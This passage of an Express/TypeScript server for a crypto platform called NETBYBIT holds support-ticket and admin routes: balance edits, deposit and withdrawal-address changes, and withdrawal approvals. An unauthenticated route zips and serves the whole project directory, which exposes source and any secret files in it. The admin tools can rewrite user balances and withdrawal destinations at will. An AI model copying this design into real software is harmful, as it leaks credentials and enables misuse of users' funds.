app.post('/api/support/tickets/:ticketId/reply', authMiddleware, (req: any, res) => {
  const { ticketId } = req.params;
  const { message } = req.body;

  if (!message || !message.trim()) {
    return res.status(400).json({ error: 'Reply message cannot be empty' });
  }

  const db = loadDB();
  const ticketIndex = db.supportTickets.findIndex((t) => t.id === ticketId);

  if (ticketIndex === -1) {
    return res.status(404).json({ error: 'Support conversation not found' });
  }

  const ticket = db.supportTickets[ticketIndex];

  // Privacy check: User can only access their own tickets unless admin
  if (req.user.role !== 'admin' && ticket.userId !== req.user.id) {
    return res.status(403).json({ error: 'Unauthorized to access this conversation' });
  }

  const isUserSender = req.user.role !== 'admin' || ticket.userId === req.user.id;
  const senderRole = isUserSender ? ('user' as const) : ('admin' as const);
  const senderName = isUserSender ? (req.user.name || 'User') : 'NETBYBIT Support Staff';

  const newReply = {
    id: 'rpl_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
    sender: senderRole,
    senderName,
    message: message.trim(),
    createdAt: new Date().toISOString(),
    status: 'Delivered',
  };

  ticket.replies.push(newReply);
  if (isUserSender && ticket.status === 'Closed') {
    ticket.status = 'Open';
  } else if (!isUserSender) {
    ticket.status = 'In Progress';
  }

  if (isUserSender) {
    // Dispatch Email Alert to netbybitsupport@gmail.com
    sendEmailNotification(db, {
      to: 'netbybitsupport@gmail.com',
      subject: `Support Alert: New Message from User ${ticket.userEmail} (#${ticket.id})`,
      category: 'Support Inquiry',
      isAdminAlert: true,
      body: `Customer Support Alert:

User ${ticket.userName} (${ticket.userEmail}) sent a new message in Chat #${ticket.id}:

Subject: ${ticket.subject}
Message: "${message.trim()}"
Date & Time: ${new Date().toLocaleString()}

Reply directly via the Customer Support / Admin Dashboard.`,
    });
  } else {
    // Staff reply -> Dispatch Email to User & In-App Notification
    sendEmailNotification(db, {
      to: ticket.userEmail,
      subject: `NETBYBIT Support - Response to Ticket #${ticket.id}`,
      category: 'Customer Support Reply',
      body: `Hello ${ticket.userName || 'Valued User'},

The NETBYBIT Customer Support Team has replied to your ticket #${ticket.id} ("${ticket.subject}"):

"${message.trim()}"

Sender Address: netbybitsupport@gmail.com

You can view full conversation history in your account dashboard.

Thank you,
NETBYBIT Support Team`,
    });

    db.notifications.push({
      id: 'notif_' + Date.now(),
      userId: ticket.userId,
      title: `Support Reply: #${ticket.id}`,
      message: `Customer Support replied: "${message.trim().substring(0, 60)}..."`,
      isRead: false,
      createdAt: new Date().toISOString(),
    });
  }

  saveDB(db);
  res.json({ success: true, ticket });
});


// --- ADMIN API ROUTES ---

// Admin Stats
app.get('/api/admin/stats', adminMiddleware, (req, res) => {
  const db = loadDB();
  const totalUsers = db.users.length;
  const openTickets = db.supportTickets.filter((t) => t.status !== 'Closed').length;
  const totalTransactions = db.transactions.length;

  // Calculate platform balance approximation
  let totalUsd = 0;
  db.users.forEach((u) => {
    totalUsd += (u.balances.BTC || 0) * 68450 + (u.balances.ETH || 0) * 3540 + (u.balances.BNB || 0) * 585 + (u.balances.USDT_ERC20 || 0) + (u.balances.USDT_TRC20 || 0);
  });

  res.json({
    totalUsers,
    totalPlatformUsd: Math.round(totalUsd),
    openTickets,
    totalTransactions,
    activeDepositNetworks: Object.keys(db.depositAddresses || {}).length,
  });
});

// Admin: Edit Deposit Wallet Addresses
app.post('/api/admin/deposit-addresses', adminMiddleware, (req, res) => {
  const { depositAddresses } = req.body;
  if (!depositAddresses) {
    return res.status(400).json({ error: 'Deposit addresses object is required' });
  }

  const db = loadDB();
  db.depositAddresses = {
    ...db.depositAddresses,
    ...depositAddresses,
  };

  saveDB(db);
  res.json({ success: true, depositAddresses: db.depositAddresses, message: 'Deposit addresses updated successfully across all networks.' });
});

// Admin: Get all Users
app.get('/api/admin/users', adminMiddleware, (req, res) => {
  const db = loadDB();
  const safeUsers = db.users.map(({ passwordHash, ...u }) => u);
  res.json(safeUsers);
});

// Admin: Edit User Balance
app.put('/api/admin/users/:userId/balance', adminMiddleware, (req, res) => {
  const { userId } = req.params;
  const { balances, asset, amount, action } = req.body;

  const db = loadDB();
  const userIndex = db.users.findIndex((u) => u.id === userId);

  if (userIndex === -1) {
    return res.status(404).json({ error: 'User not found' });
  }

  if (balances) {
    db.users[userIndex].balances = {
      ...db.users[userIndex].balances,
      ...balances,
    };
  } else if (asset && amount !== undefined && action) {
    const current = db.users[userIndex].balances[asset] || 0;
    const delta = action === 'add' ? parseFloat(amount) : -parseFloat(amount);
    db.users[userIndex].balances[asset] = Math.max(0, current + delta);
  }

  saveDB(db);
  const { passwordHash: _, ...safeUser } = db.users[userIndex];
  res.json({ success: true, user: safeUser, message: 'User balances updated successfully' });
});

// Admin: Search user by email & adjust balance (add or deduct) with audit log, reason & email notification
app.post('/api/admin/adjust-user-balance', adminMiddleware, (req: any, res) => {
  const { email, asset, action = 'add', amount, reason = '' } = req.body;
  if (!email || !asset || amount === undefined || amount === null) {
    return res.status(400).json({ error: 'Email, asset, and amount are required' });
  }

  const parsedAmount = parseFloat(amount);
  if (isNaN(parsedAmount) || parsedAmount <= 0) {
    return res.status(400).json({ error: 'Amount must be a positive number' });
  }

  const isDeduct = action === 'deduct' || action === 'subtract';

  const db = loadDB();
  const userIndex = db.users.findIndex((u) => u.email.toLowerCase() === email.trim().toLowerCase());

  if (userIndex === -1) {
    return res.status(404).json({ error: `User with email "${email}" not found` });
  }

  const user = db.users[userIndex];
  const currentBalance = user.balances[asset] || 0;

  if (isDeduct && currentBalance < parsedAmount) {
    return res.status(400).json({
      error: `Cannot deduct ${parsedAmount} ${asset}. User currently has ${currentBalance} ${asset} available.`,
    });
  }

  const newBalance = isDeduct ? Math.max(0, currentBalance - parsedAmount) : currentBalance + parsedAmount;
  user.balances[asset] = newBalance;

  const nowISO = new Date().toISOString();
  const formattedDateTime = new Date().toLocaleString('en-US', {
    dateStyle: 'medium',
    timeStyle: 'medium',
  });

  const assetNames: Record<string, string> = {
    BTC: 'Bitcoin (BTC)',
    ETH: 'Ethereum (ETH)',
    BNB: 'BNB Smart Chain (BNB)',
    TRX: 'TRON (TRX)',
    USDT_ERC20: 'Tether USD (USDT ERC-20)',
    USDT_TRC20: 'Tether USD (USDT TRC-20)',
  };
  const assetDisplay = assetNames[asset] || asset;

  // Audit Log Entry
  const auditEntry = {
    id: 'audit_' + Date.now(),
    adminEmail: req.user.email,
    userEmail: user.email,
    userId: user.id,
    asset,
    action: isDeduct ? 'deduct' : 'add',
    amount: parsedAmount,
    newBalance: user.balances[asset],
    reason: reason ? reason.trim() : 'Admin Balance Adjustment',
    date: nowISO,
  };

  if (!db.auditLogs) db.auditLogs = [];
  db.auditLogs.push(auditEntry);

  const subject = `NETBYBIT - Account Balance ${isDeduct ? 'Deduction' : 'Credit'} Notification`;
  const body = `Hello ${user.name || 'Valued User'},

Your NETBYBIT account balance has been adjusted by an administrator.

• Cryptocurrency Affected: ${assetDisplay}
• Adjustment Type: ${isDeduct ? 'Deduction (-)' : 'Credit (+)'}
• Amount ${isDeduct ? 'Deducted' : 'Added'}: ${isDeduct ? '-' : '+'}${parsedAmount} ${asset}
• Updated Balance: ${user.balances[asset]} ${asset}
• Date & Time: ${formattedDateTime}
${reason && reason.trim() ? `• Reason / Note: ${reason.trim()}\n` : ''}
Your updated wallet balance is reflected in your dashboard immediately.

If you have any questions regarding this balance adjustment, please contact customer support at netbybitsupport@gmail.com.

Thank you,
NETBYBIT Support`;

  // Email Notification preview & dispatch
  const emailNotificationRecord = sendEmailNotification(db, {
    to: user.email,
    subject,
    category: 'Admin Balance Update',
    body,
  });

  const emailNotification = {
    to: emailNotificationRecord.to,
    subject: emailNotificationRecord.subject,
    body: emailNotificationRecord.body,
    sentAt: emailNotificationRecord.sentAt,
  };

  // In-app Notification
  db.notifications.push({
    id: 'notif_' + Date.now(),
    userId: user.id,
    title: `Balance ${isDeduct ? 'Deducted' : 'Credited'}: ${asset}`,
    message: `Your balance for ${asset} was ${isDeduct ? 'deducted by' : 'credited with'} ${parsedAmount} ${asset}. New balance: ${user.balances[asset]} ${asset}.`,
    isRead: false,
    createdAt: nowISO,
  });

  saveDB(db);

  const { passwordHash: _, ...safeUser } = user;
  res.json({
    success: true,
    user: safeUser,
    auditEntry,
    emailNotification,
    message: `Successfully ${isDeduct ? 'deducted' : 'credited'} ${parsedAmount} ${asset} ${isDeduct ? 'from' : 'to'} ${user.email}. Notification email sent.`,
  });
});

// Legacy / Alias route for credit user balance
app.post('/api/admin/credit-user-balance', adminMiddleware, (req: any, res, next) => {
  req.body.action = req.body.action || 'add';
  app._router.handle(req, res, next);
});

// Admin: Get Audit Logs
app.get('/api/admin/audit-logs', adminMiddleware, (req, res) => {
  const db = loadDB();
  res.json((db.auditLogs || []).sort((a, b) => new Date(b.date).getTime() - new Date(a.date).getTime()));
});

// Admin: Get All Dispatched Email Logs
app.get('/api/admin/email-logs', adminMiddleware, (req, res) => {
  const db = loadDB();
  res.json((db.emailLogs || []).sort((a, b) => new Date(b.sentAt).getTime() - new Date(a.sentAt).getTime()));
});

// Admin: Edit User Withdrawal Address
app.put('/api/admin/users/:userId/withdrawal-address', adminMiddleware, (req, res) => {
  const { userId } = req.params;
  const { withdrawalAddresses, asset, address } = req.body;

  const db = loadDB();
  const userIndex = db.users.findIndex((u) => u.id === userId);

  if (userIndex === -1) {
    return res.status(404).json({ error: 'User not found' });
  }

  if (withdrawalAddresses) {
    db.users[userIndex].withdrawalAddresses = {
      ...db.users[userIndex].withdrawalAddresses,
      ...withdrawalAddresses,
    };
  } else if (asset && address !== undefined) {
    db.users[userIndex].withdrawalAddresses = {
      ...db.users[userIndex].withdrawalAddresses,
      [asset]: address,
    };
  }

  saveDB(db);
  const { passwordHash: _, ...safeUser } = db.users[userIndex];
  res.json({ success: true, user: safeUser, message: 'User withdrawal addresses updated' });
});

// Admin: Update User Status (active / suspended)
app.put('/api/admin/users/:userId/status', adminMiddleware, (req, res) => {
  const { userId } = req.params;
  const { status } = req.body;

  const db = loadDB();
  const userIndex = db.users.findIndex((u) => u.id === userId);

  if (userIndex === -1) {
    return res.status(404).json({ error: 'User not found' });
  }

  db.users[userIndex].status = status;
  saveDB(db);
  res.json({ success: true, status: db.users[userIndex].status });
});

// Admin: Get All Transactions
app.get('/api/admin/transactions', adminMiddleware, (req, res) => {
  const db = loadDB();
  const txsWithEmails = db.transactions.map((tx) => {
    const user = db.users.find((u) => u.id === tx.userId);
    return {
      ...tx,
      userEmail: user ? user.email : 'Unknown',
    };
  });
  res.json(txsWithEmails.sort((a, b) => new Date(b.date).getTime() - new Date(a.date).getTime()));
});

// Admin: Update Transaction Status (Approve / Reject Withdrawal)
app.put('/api/admin/transactions/:txId/status', adminMiddleware, (req: any, res) => {
  const { txId } = req.params;
  const { status } = req.body; // 'completed' | 'approved' | 'failed' | 'declined'

  if (!status) {
    return res.status(400).json({ error: 'Status is required' });
  }

  const db = loadDB();
  const txIndex = db.transactions.findIndex((t) => t.id === txId);

  if (txIndex === -1) {
    return res.status(404).json({ error: 'Transaction not found' });
  }

  const tx = db.transactions[txIndex];
  const userIndex = db.users.findIndex((u) => u.id === tx.userId);
  const user = userIndex !== -1 ? db.users[userIndex] : null;

  const isApprove = status === 'completed' || status === 'approved';
  const isDecline = status === 'failed' || status === 'declined' || status === 'rejected';

  if (!isApprove && !isDecline) {
    return res.status(400).json({ error: 'Invalid status. Must be completed/approved or failed/declined' });
  }

  const newStatus = isApprove ? 'completed' : 'failed';
  const actionLabel = isApprove ? 'Approved' : 'Declined';
  const statusLabel = isApprove ? 'Successful' : 'Declined';

  // If declining a pending withdrawal, refund the user's balance
  if (isDecline && tx.status === 'pending' && user && (tx.type === 'withdraw' || tx.type === 'send')) {
    user.balances[tx.asset] = (user.balances[tx.asset] || 0) + tx.amount;
  }

  tx.status = newStatus;
  const nowISO = new Date().toISOString();

  // Audit Log Record
  const auditEntry = {
    id: 'audit_' + Date.now(),
    adminEmail: req.user.email,
    userEmail: user ? user.email : 'Unknown',
    userId: tx.userId,
    asset: tx.asset,
    amount: tx.amount,
    newBalance: user ? (user.balances[tx.asset] || 0) : 0,
    date: nowISO,
    action: `Withdrawal ${actionLabel}`,
    status: statusLabel,
  };

  if (!db.auditLogs) db.auditLogs = [];
  db.auditLogs.push(auditEntry);

  // Email Notification Record & Dispatch
  const assetLabel = tx.asset === 'USDT_ERC20' ? 'USDT (ERC-20)' : tx.asset === 'USDT_TRC20' ? 'USDT (TRC-20)' : tx.asset;
  const declineBody = `Hello,

Your withdrawal request for ${tx.amount.toLocaleString()} ${assetLabel} to the destination address:

${tx.destinationAddress || 'N/A'}

was not completed.

Transaction ID: ${tx.id}
Date & Time: ${new Date(nowISO).toLocaleString()}
Status: Declined

The full requested amount has been returned to your account balance.

If you have any questions or need assistance, please contact our support team at netbybitsupport@gmail.com.

Thank you,

NETBYBIT Support Team`;

  const approveBody = `Hello,

Your withdrawal request for ${tx.amount} ${tx.asset} to destination address "${tx.destinationAddress || 'N/A'}" has been APPROVED by the administrator.

Transaction ID: ${tx.id}
Date & Time: ${new Date(nowISO).toLocaleString()}
Final Status: Successful

If you have questions, please contact customer support at netbybitsupport@gmail.com.

Thank you,
NETBYBIT Support Team`;

  const emailNotificationRecord = sendEmailNotification(db, {
    to: user ? user.email : 'User',
    subject: isDecline ? 'Withdrawal Update' : `Withdrawal Request ${actionLabel}`,
    category: 'Withdrawal Approval/Rejection',
    body: isDecline ? declineBody : approveBody,
  });

  const emailNotification = {
    to: emailNotificationRecord.to,
    subject: emailNotificationRecord.subject,
    body: emailNotificationRecord.body,
    sentAt: emailNotificationRecord.sentAt,
  };

  // In-app notification
  if (user) {
    db.notifications.push({
      id: 'notif_' + Date.now(),
      userId: user.id,
      title: `Withdrawal ${actionLabel}`,
      message: `Your withdrawal of ${tx.amount} ${tx.asset} was ${actionLabel.toLowerCase()}.${isDecline ? ' Funds have been returned to your balance.' : ''}`,
      isRead: false,
      createdAt: nowISO,
    });
  }

  saveDB(db);

  res.json({
    success: true,
    transaction: {
      ...tx,
      userEmail: user ? user.email : 'Unknown',
    },
    auditEntry,
    emailNotification,
    message: `Withdrawal transaction #${tx.id} was successfully ${actionLabel.toLowerCase()}. User notified.`,
  });
});

// Admin: Get All Support Tickets
app.get('/api/admin/tickets', adminMiddleware, (req, res) => {
  const db = loadDB();
  res.json(db.supportTickets.sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()));
});

// Admin: Reply to Support Ticket
app.post('/api/admin/tickets/:ticketId/reply', adminMiddleware, (req: any, res) => {
  const { ticketId } = req.params;
  const { message } = req.body;

  if (!message) {
    return res.status(400).json({ error: 'Reply message cannot be empty' });
  }

  const db = loadDB();
  const ticketIndex = db.supportTickets.findIndex((t) => t.id === ticketId);

  if (ticketIndex === -1) {
    return res.status(404).json({ error: 'Ticket not found' });
  }

  const ticket = db.supportTickets[ticketIndex];
  const newReply = {
    id: 'rpl_' + Date.now(),
    sender: 'admin' as const,
    senderName: 'NETBYBIT Support Admin',
    message: message.trim(),
    createdAt: new Date().toISOString(),
  };

  ticket.replies.push(newReply);
  ticket.status = 'In Progress';

  // Send Email Notification to User for Support Reply
  sendEmailNotification(db, {
    to: ticket.userEmail,
    subject: `NETBYBIT Support - Response to Ticket #${ticket.id}`,
    category: 'Customer Support Reply',
    body: `Hello ${ticket.userName || 'Valued User'},

NETBYBIT Customer Support has replied to your ticket #${ticket.id} ("${ticket.subject}"):

"${message.trim()}"

Sender Address: ${SENDER_EMAIL}

You can view full conversation history in your account dashboard.

Thank you,
NETBYBIT Support`,
  });

  // Push notification to user
  db.notifications.push({
    id: 'notif_' + Date.now(),
    userId: ticket.userId,
    title: `Support Ticket Reply: #${ticket.id}`,
    message: `An admin has replied to your support ticket: "${ticket.subject}"`,
    isRead: false,
    createdAt: new Date().toISOString(),
  });

  saveDB(db);
  res.json({ success: true, ticket });
});


// Admin: Update Ticket Status
app.put('/api/admin/tickets/:ticketId/status', adminMiddleware, (req, res) => {
  const { ticketId } = req.params;
  const { status } = req.body;

  const db = loadDB();
  const ticketIndex = db.supportTickets.findIndex((t) => t.id === ticketId);

  if (ticketIndex === -1) {
    return res.status(404).json({ error: 'Ticket not found' });
  }

  db.supportTickets[ticketIndex].status = status;
  saveDB(db);
  res.json({ success: true, ticket: db.supportTickets[ticketIndex] });
});

// Admin: Delete Ticket
app.delete('/api/admin/tickets/:ticketId', adminMiddleware, (req, res) => {
  const { ticketId } = req.params;

  const db = loadDB();
  db.supportTickets = db.supportTickets.filter((t) => t.id !== ticketId);
  saveDB(db);

  res.json({ success: true, message: 'Ticket deleted' });
});

// Helper function to get or build project ZIP
const getOrCreateProjectZip = (): string | null => {
  const dataZip = path.join(process.cwd(), 'data', 'netbybit-project.zip');
  const distZip = path.join(process.cwd(), 'dist', 'netbybit-project.zip');

  if (fs.existsSync(dataZip)) return dataZip;
  if (fs.existsSync(distZip)) return distZip;

  try {
    const { execSync } = require('child_process');
    execSync(`python3 -c '
import zipfile, os
os.makedirs("data", exist_ok=True)
zip_filename = "data/netbybit-project.zip"
ignore_dirs = {"node_modules", ".git", ".cache", "dist", "data"}
with zipfile.ZipFile(zip_filename, "w", zipfile.ZIP_DEFLATED) as zipf:
    for root, dirs, files in os.walk("."):
        dirs[:] = [d for d in dirs if d not in ignore_dirs]
        for file in files:
            if file.endswith(".zip"): continue
            filepath = os.path.join(root, file)
            zipf.write(filepath, os.path.relpath(filepath, "."))
'`);
    if (fs.existsSync(dataZip)) return dataZip;
  } catch (err) {
    console.error('Failed to generate ZIP dynamically:', err);
  }
  return null;
};

// Downloadable Project ZIP Routes
app.get(['/api/download-zip', '/netbybit-project.zip'], (req, res) => {
  const zipPath = getOrCreateProjectZip();
  if (zipPath && fs.existsSync(zipPath)) {
    res.setHeader('Content-Type', 'application/zip');
    res.setHeader('Content-Disposition', 'attachment; filename="netbybit-project.zip"');
    return res.sendFile(zipPath);
  }
  return res.status(500).json({ error: 'Failed to generate project ZIP archive.' });
});

// --- VITE MIDDLEWARE SETUP ---
async function startServer() {
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`NETBYBIT Fullstack Server running on http://localhost:${PORT}`);
  });
}

startServer();
